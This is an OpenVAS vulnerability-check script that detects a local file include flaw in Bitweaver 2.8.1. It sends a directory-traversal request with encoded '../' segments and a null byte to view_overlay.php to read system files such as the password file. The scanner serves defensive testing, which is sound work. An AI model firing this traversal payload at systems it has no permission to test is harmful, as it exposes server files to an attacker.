###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_bitweaver_56230.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# Bitweaver Multiple Cross Site Scripting and Local File Include Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Bitweaver is prone to multiple cross-site scripting vulnerabilities
and a local file include vulnerability.

An attacker may leverage these issues to execute arbitrary script code
in the browser of an unsuspecting user in the context of the affected
site, steal cookie-based authentication credentials, and open or run
arbitrary files in the context of the web server process.

Bitweaver 2.8.1 is vulnerable; other versions may also be affected.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103593";
CPE = "cpe:/a:bitweaver:bitweaver";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(56230);
 script_cve_id("CVE-2012-5192","CVE-2012-5193");
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_version ("$Revision: 7577 $");

 script_name("Bitweaver Multiple Cross Site Scripting and Local File Include Vulnerabilities");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/56230");
 script_xref(name : "URL" , value : "http://bitweaver.org");

 script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
 script_tag(name:"creation_date", value:"2012-10-26 10:50:00 +0200 (Fri, 26 Oct 2012)");
 script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("secpod_bitweaver_detect.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!get_port_state(port))exit(0);

if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);
files = traversal_files();

foreach file (keys(files)) {

  url = dir  + '/gmap/view_overlay.php?overlay_type=' + crap(data:"..%2F", length:15*5) + '/' + files[file] + '%00';

  if(http_vuln_check(port:port, url:url,pattern:file)) {
     
    security_message(port:port);
    exit(0);

  }
}

exit(0);
